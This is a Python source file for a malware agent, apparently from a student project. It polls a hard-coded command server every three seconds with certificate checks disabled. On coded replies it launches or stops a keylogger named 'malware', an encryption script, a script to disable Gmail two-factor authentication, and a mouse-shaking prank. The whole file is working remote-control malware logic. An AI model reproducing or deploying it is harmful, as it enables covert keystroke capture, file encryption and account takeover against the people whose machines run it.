import requests
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import time
import subprocess
import logging

logging.basicConfig(filename="agent.log", level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
	interval = 3
	keylogger = 0
	enc = 0
	mouse = 0
	tfa = 0
	while True:
		# subprocess.run(["sleep", "3"])
		time.sleep(3)
		url = "https://192.168.80.243/command"
		try:
			response = requests.get(url, verify=False)
			logging.critical(response.text)
			if response.text == '00010': #Start Keylogger
				subprocess.Popen("/home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/malware /home/anthony/Desktop/newest2", shell=True)
			elif response.text == '00011': #Stop keylogger
				subprocess.Popen("exec /usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/cierre.py cmake-build-debug/malware", shell=True)
			elif response.text == '00100': #Start encryption
				subprocess.Popen("/usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/oftenc/encryption.py", shell=True)
			elif response.text == '00101': #Start disable 2factor
				subprocess.Popen("/usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/etc/gmail.py", shell=True)
			elif response.text == '00110': #Start cursed mouse
				subprocess.Popen("/usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/oftmouse/shake.py", shell=True)
				mouse = 1
			elif response.text == '00111': #Stop cursed mouse
				subprocess.Popen("exec /usr/bin/python3 /home/anthony/Desktop/projects/master-upc/window/cmake-build-debug/cierre.py shake.py", shell=True)
				mouse = 0

		except Exception as e:
			continue

if __name__ == "__main__":
	main()
